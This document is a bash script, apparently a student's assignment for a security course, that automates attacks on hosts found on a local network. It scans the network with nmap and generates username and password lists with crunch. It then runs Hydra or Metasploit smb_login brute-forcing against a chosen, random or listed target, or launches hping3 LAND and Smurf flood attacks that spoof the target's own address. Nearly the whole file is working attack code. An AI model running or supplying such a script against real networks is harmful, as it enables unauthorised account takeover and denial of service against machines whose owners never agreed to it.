#!/bin/bash

#~ Name: Warren Justin Chan
#~ Code: S5
#~ Class: CFC3110
#~ Trainer: James

#~ Goal of this script is to allow users to choose three separate attacks on a chosen or random network.
#~ Attacks chosen are: Hydra, Metasploit User Enumerator (via SMB), and Hping3 (LAND or Smurf)

figlet -c WARREN\'S ATTACK SCRIPT

echo

#~ All logs are stored in /var/log/socchecker.log
#~ Hid echo output in /dev/null so that it doesn't show in script.
#~ $() in 'echo' is used to call upon a command within 'echo'
#~ Instead of using > to store output of echo into socchecker.log, sudo tee -a (append) was used to bypass permissions error

(echo "$(date) : Script started") | sudo tee -a /var/log/socchecker.log > /dev/null

echo "Your IP is:"
ifconfig | head -n 2 | tail -n 1 | awk '{print $2}'

echo "Your netmask is:"
ifconfig | head -n 2 | tail -n 1 | awk '{print $4}'

echo ''

echo "Insert the ip/subnet you would like to scan:"
read ipsubnet

echo ''

echo "The list of IP's in your network are:"

#~ -sn flag used to give a simple scan of the network omitting port scans
#~ grep with extended regular expressions to get the IP's found and then put into a list
sudo nmap -sn $ipsubnet | grep -Eo '([0-9]{1,3}[\.]){3}[0-9]{1,3}' | uniq > iplist.lst

cat iplist.lst

#~ Random IP variable created for use in the attacks
#~ Everytime script is run, a random IP is selected and used throughout the IP. To change random IP user would have to start the script again.
randomip=$(shuf iplist.lst | head -n 1)	

#Create a crunch list with user input variables. 

echo

echo "Create list of usernames to use - "

echo

echo "Enter minimum number of charaters"
read crunchmin

echo "Enter maximum number of characters"
read crunchmax

echo "Do you want to specify A) Patterns or B) Characters and Symbols?"
read crunchpattern

#~ To give users more agency, '||' is used in the if statement

if [ $crunchpattern == A ] || [ $crunchpattern == a ]
then
	echo "Pattern list: 
	@ = lower case characters
	, = upper case characters
	% = numbers
	^ = symbols
	Enter Pattern:"
	read crunchpatternyes
	
	crunch $crunchmin $crunchmax -t $crunchpatternyes -o usernames.txt
	
elif [ $crunchpattern == B ] || [ $crunchpattern == b ]
then

echo "Enter characters/symbols to use:"
read crunchcharacters


	crunch $crunchmin $crunchmax $crunchcharacters -o usernames.txt
	
else

echo "Input not recognized - exiting"
exit
	

fi

echo "List saved to usernames.txt"

echo

echo "Create list of passwords to use - "

echo

echo "Enter minimum number of charaters"
read crunchmin

echo "Enter maximum number of characters"
read crunchmax

echo "Do you want to specify A) Patterns or B) Characters and Symbols?"
read crunchpattern

if [ $crunchpattern == A ] || [ $crunchpattern == a ]
then
	echo "Pattern list: 
	@ = lower case characters
	, = upper case characters
	% = numbers
	^ = symbols
	Enter Pattern:"
	read crunchpatternyes
	
	crunch $crunchmin $crunchmax -t $crunchpatternyes -o passwords.txt
	
elif [ $crunchpattern == B ] || [ $crunchpattern == b ]
then

echo "Enter characters/symbols to use"
read crunchcharacters


	crunch $crunchmin $crunchmax $crunchcharacters -o passwords.txt
	
else

echo "Input not recognized - exiting"
exit
fi

echo "List saved to passwords.txt"

echo

echo "Choose attack:
A) Hydra
B) Metasploit User Enumerator
C) Hping3 LAND/Smurf

Type 'exit' to exit script."

read chooseattack

#~ Entire attack is wrapped in a function for future use

function ATTACK()
{
	
#~ case command to give users options to choose between attacks, any other inputs will exit the script.

case $chooseattack in

A|a)

#~ -e flag enables interpretation of backlash escapes. 
#~ \e'[0;31m' to change text color, in this instance it's red. '\e[0m' returns echo output to original color. Based of ANSI Escape Codes.

echo -e "Attack: \e[0;31mHydra \e[0m"

echo "Description: Fast network login cracker which supports multiple protocols.
Allows user to:
- Choose from existing username/password list created or enter specific username/password
- Choose specific/random/list of IP's to target 
- Choose specific service (eg: ssh/rdp/telnet) to target 
- Successful results will be listed otherwise left blank

List of services that are supported:
		adam6500  afp asterisk cisco cisco-enable cvs firebird ftp ftps http[s]-{head|get|post}
              http[s]-{get|post}-form  http-proxy  http-proxy-urlenum  icq   imap[s]   irc   ldap2[s]
              ldap3[-{cram|digest}md5][s] mssql mysql(v4) mysql5 ncp nntp oracle oracle-listener ora‐
              cle-sid pcanywhere pcnfs pop3[s] postgres rdp radmin2 redis rexec rlogin rpcap rsh rtsp
              s7-300  sapr3  sip smb smtp[s] smtp-enum snmp socks5 ssh sshkey svn teamspeak telnet[s]
              vmauthd vnc xmpp


"

function HYDRAFUNCTION()
{
	

echo "Would you like to use username list and password list? (Y/N)"
read hydrauserpasslist

#~ if else statement used to separate the use of using a username and password list

	if [ $hydrauserpasslist == Y ] || [ $hydrauserpasslist == y ]
	then

echo "Specify Service (example: ssh/rdp/smb/ftp etc)"
read hydraport

echo "Would you like to A) Choose a target B) Randomize target C) Use IP List"
read hydraip

case $hydraip in

	A|a)	
			echo 'Please specify IP target'
			read hydratarget
			
#~ -vV (verbose)flag for hydra used to give more information to the user

			sudo hydra -L usernames.txt -P passwords.txt $hydratarget $hydraport -vV > hydra_results.txt
			
	
			(echo "$(date) : hydra : $hydratarget") | sudo tee -a /var/log/socchecker.log > /dev/null
			
				echo "Results saved to hydra_results.txt"
				
				echo "Fetching successful attempts.."		
				
				cat hydra_results.txt | grep host
			;;
			
	B|b)
			echo "Random IP chosen: $randomip"
			sudo hydra -L usernames.txt -P passwords.txt $randomip $hydraport -vV > hydra_results.txt
			(echo "$(date) : hydra : $randomip") | sudo tee -a /var/log/socchecker.log > /dev/null
			
				echo "Results saved to hydra_results.txt"
				
				echo "Fetching successful attempts.."	
					
				#~ grep host to display successful attempts
				cat hydra_results.txt | grep host
				
				
			;;
			
	C|c)
			echo "Using iplist.lst"
			
			sudo hydra -L usernames.txt -P passwords.txt -M iplist.lst $hydraport -vV > hydra_results.txt
			
			#~ To ensure proper formatting of log files, tr (translate) command used.
			#~ '\n' '\t' takes new lines and outputs them into horizontal tabs
			
			(echo "$(date) : hydra : $(cat iplist.lst | tr '\n' '\t')") | sudo tee -a /var/log/socchecker.log > /dev/null
			
				echo "Results saved to hydra_results.txt"
				
				echo "Fetching successful attempts.."		
				
				cat hydra_results.txt | grep host
			;;
		
	exit|EXIT)
	
			echo "Exiting.."
			exit
			
			;;
			
		#~ Asterisk to apply to every other input command not listed
		*)
		
			echo "Input not recognized - exiting"
			exit
		;;
esac
 
elif [ $hydrauserpasslist == N ] || [ $hydrauserpasslist == n ]
	then


echo "Enter Username"
read hydrauser

echo "Enter Password"
read hydrapass

echo "Specify Service (example: ssh/rdp/smb/ftp etc)"
read hydraport

echo "Would you like to A) Choose a target B) Randomize target C) Use IP List"
read hydraip

case $hydraip in

	A|a)	
			echo 'Please specify IP target'
			read hydratarget

			sudo hydra -l $hydrauser -p $hydrapass $hydratarget $hydraport -vV > hydra_results.txt
				(echo "$(date) : hydra : $hydratarget") | sudo tee -a /var/log/socchecker.log > /dev/null
				
				echo "Results saved to hydra_results.txt"
				
				echo "Fetching successful attempts.."		
				
				cat hydra_results.txt | grep host
			
			;;
			
	B|b)
			echo $randomip
			sudo hydra -l $hydrauser -p $hydrapass $randomip $hydraport -vV > hydra_results.txt
				(echo "$(date) : hydra : $randomip") | sudo tee -a /var/log/socchecker.log > /dev/null
				
				echo "Results saved to hydra_results.txt"
				
				echo "Fetching successful attempts.."		
				
				cat hydra_results.txt | grep host
			
			;;
			
	C|c)
	
			sudo hydra -l $hydrauser -p $hydrapass -M iplist.lst $hydraport -vV > hydra_results.txt
				(echo "$(date) : hydra : $(cat iplist.lst | tr '\n' '\t')") | sudo tee -a /var/log/socchecker.log > /dev/null
				
				echo "Results saved to hydra_results.txt"
				
				echo "Fetching successful attempts.."		
				
				cat hydra_results.txt | grep host
			
			
			;;
			
	exit|EXIT) 
		
				echo "Exiting.."
				
				exit
		
			
			;;
			
#~ Asterisk to apply to every other input command
		*)
		
			echo "Input not recognized - exiting"
			exit
		;;
esac

elif [ $hydrauserpasslist == exit ] || [ $hydrauserpasslist == EXIT ]
	then
	
	echo "Exiting.."
	exit

else

echo "Input not recognized - exiting"

exit


	fi
	
echo
HYDRAFUNCTION
}

HYDRAFUNCTION
;;


B|b)

echo -e "Attack: \e[0;31mMetasploit User Enumerator \e[0m"

echo "Description: Remotely bruteforces through the SMB port. Successful hosts and logins are recorded for ease of access.
Allows users to:
- Choose between a specific, random, or IP list to target.
- Successful results will be listed otherwise left blank
"


function MSFSMBFUNCTION()
{

echo "Would you like to A) Specify an IP , B) Randomize IP , C) Use IP list?"
read msfip

case $msfip in

A|a)

echo "Please specify IP:"
read msftarget

#~ Commands for msfconsole are stored into an .rc file
#~ For ease of use, the default setting for usernames and passwords has been set to the list that was created by crunch

	echo 'use auxiliary/scanner/smb/smb_login' > smb_login.rc
	echo "set rhosts $msftarget" >> smb_login.rc
	echo 'set user_file usernames.txt' >> smb_login.rc
	echo 'set pass_file passwords.txt' >> smb_login.rc
	echo 'run' >> smb_login.rc
	echo 'exit' >> smb_login.rc

#~ -r flag on msfconsole to read the resource files 
#~ -o to output results into smb_results.txt
	msfconsole -r smb_login.rc -o smb_results.txt
	
	echo "Results saved to smb_results.txt"
	echo
	echo "Fetching successful attempts.."
	
	cat smb_results.txt | grep Success
	echo

	
	(echo "$(date) : msf_smblogin : $msftarget") | sudo tee -a /var/log/socchecker.log > /dev/null

	;;

B|b)	

	echo "Random IP used: $randomip"

	echo 'use auxiliary/scanner/smb/smb_login' > smb_login.rc
	echo "set rhosts $randomip" >> smb_login.rc
	echo 'set user_file usernames.txt' >> smb_login.rc
	echo 'set pass_file passwords.txt' >> smb_login.rc
	echo 'run' >> smb_login.rc
	echo 'exit' >> smb_login.rc
	
	msfconsole -r smb_login.rc -o smb_results.txt
	
	echo "Results saved to smb_results.txt"
	echo
	echo "Fetching successful attempts.."
	
	cat smb_results.txt | grep Success
	echo
	

	(echo "$(date) : msf_smblogin : $randomip") | sudo tee -a /var/log/socchecker.log > /dev/null	
	
	;;

C|c)

	echo 'use auxiliary/scanner/smb/smb_login' > smb_login.rc
	echo "set rhosts file:iplist.lst" >> smb_login.rc
	echo 'set user_file usernames.txt' >> smb_login.rc
	echo 'set pass_file passwords.txt' >> smb_login.rc
	echo 'run' >> smb_login.rc
	echo 'exit' >> smb_login.rc
	
	msfconsole -r smb_login.rc -o smb_results.txt
	
	echo "Results saved to smb_results.txt"
	echo
	echo "Fetching successful attempts.."
	
	cat smb_results.txt | grep Success
	echo
	
	echo "$(date) : msf_smblogin : $(cat iplist.lst | tr '\n' '\t')" | sudo tee -a /var/log/socchecker.log > /dev/null
	
	
	
	;;
	
exit|EXIT)

	echo "Exiting.."
	exit
	
	;;
*)
	echo "Input not recognized - exiting"
	exit

;;
esac 

MSFSMBFUNCTION
}

MSFSMBFUNCTION


;;


C|c)

echo -e "Attack: \e[0;31mHping3 \e[0m"
echo "Description: Hping3 allows users to send  TCP/IP packets to selected network hosts. Can also be used to ping other networks and spoof host IP.
Allows users to:
- Choose between a LAND (Local Area Denial Network) service or Smurf Attack (Sends ICMP Packets instead of SYN packets)
"


function HPINGFUNCTION()
{
echo "Would you like to use a LAND attack or Smurf attack? (LAND/SMURF)"
read hpinglandsmurf

case $hpinglandsmurf in

	LAND|land) 

echo "Would you like to A) Specify an IP or B) Randomize IP"
read hpingip
	
	if [ $hpingip == A ] || [ $hpingip == a ]
	then
	
	echo 'Please specify IP target'
	read hpingtarget
	
	echo "Initializing.. Press Ctrl + c to stop attack"
	
#~ --flood flag calls for hping3 to send packets to target IP as fast as possible. 
#~ -a spoofs hostname
#~ The idea behind spoofing the hostname as the target name is so that the target would reply itself over again until it crashes.

	sudo hping3 $hpingtarget -a $hpingtarget -V --flood
	
	
	(echo "$(date) : hping3 : $hpingtarget") | sudo tee -a /var/log/socchecker.log > /dev/null
	
	elif [ $hpingip == B ] || [ $hpingip == b ] 
	then
	
	echo "Random IP chosen: $randomip"
	
	echo
	
	echo "Initializing.. Press Ctrl + c to stop attack"
	
	sudo hping3 $randomip -a $randomip -V --flood
	
	(echo "$(date) : hping3 : $randomip") | sudo tee -a /var/log/socchecker.log > /dev/null
	
	else
	
	echo "Input not recognized - exiting"
	exit
	fi

;;

	SMURF|smurf)

	echo "Would you like to A) Specify an IP or B) Randomize IP"
	read hpingip
	
	if [ $hpingip == A ] || [ $hpingip == a ] 
	then
	
	
	echo 'Please specify IP target'
	read hpingtarget
	
	
	echo "Initializing.. Press Ctrl + c to stop attack"
	
#~ Similar to the LAND Attack above, this command (--icmp) instead sends ICMP packets across instead of SYN packets, also causing the system to crash by responding to itself over again.
	
	sudo hping3 $hpingtarget -a $hpingtarget --icmp --flood
	
	(echo "$(date) : hping3 : $hpingtarget") | sudo tee -a /var/log/socchecker.log > /dev/null
	
	elif [ $hpingip == B ] || [ $hpingip == b ] 
	then
	
	echo "Random IP chosen: $randomip"
	
	echo
	
	echo "Initializing.. Press Ctrl + c to stop attack"
	
	sudo hping3 $randomip -a $randomip --icmp --flood 
	
	(echo "$(date) : hping3 : $randomip") | sudo tee -a /var/log/socchecker.log > /dev/null
	
	
	
	else
	
	
	echo "Input not recognized - exiting"
	exit
	fi

;;

	exit|EXIT) 
	
	echo "Exiting.."
	
	exit

;;

	*) 
		echo "Input not recognized.. Exiting."
		exit



;;

esac

HPINGFUNCTION

}
	HPINGFUNCTION

;;


	exit|EXIT)
	
	echo "Exiting.."
	exit

;;

*) 

	echo "Input not recognized - exiting.."
	exit
;;
esac

}
ATTACK



#~ References

#~ nmap IP only
#~ https://www.redhat.com/sysadmin/quick-nmap-inventory

#~ To get random IP
#~ https://unix.stackexchange.com/questions/269422/how-to-pick-a-random-element-from-the-output-of-a-command

#~ || command in if statements
#~ https://unix.stackexchange.com/questions/47584/in-a-bash-script-using-the-conditional-or-in-an-if-statement

#~ *) option in case commands
#~ https://phoenixnap.com/kb/bash-case-statement

#~ hping3 tutorials
#~ https://linuxhint.com/hping3/
#~ https://www.jaacostan.com/2018/04/dos-attacks-smurffraggleland.html
#~ https://ravi73079.medium.com/attacks-to-be-performed-using-hping3-packet-crafting-98bc25584745
#~ https://www.youtube.com/watch?v=S9FdzDXgniA&ab_channel=FreeEduHub

#~ Translate a vertical list to horizontal list
#~ https://www.unix.com/shell-programming-and-scripting/178162-converting-column-row.html

#~ Adding color into echo outputs
#~ https://stackoverflow.com/questions/5947742/how-to-change-the-output-color-of-echo-in-linux


